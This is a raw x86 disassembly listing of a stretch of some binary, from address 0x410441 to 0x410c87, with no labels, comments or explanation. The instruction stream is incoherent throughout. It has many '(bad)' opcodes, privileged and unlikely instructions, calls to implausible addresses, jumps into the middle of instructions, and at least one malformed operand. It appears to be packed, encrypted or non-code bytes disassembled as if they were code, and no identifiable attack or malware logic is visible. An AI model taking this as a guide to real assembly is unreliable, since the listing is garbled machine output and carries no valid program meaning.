  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
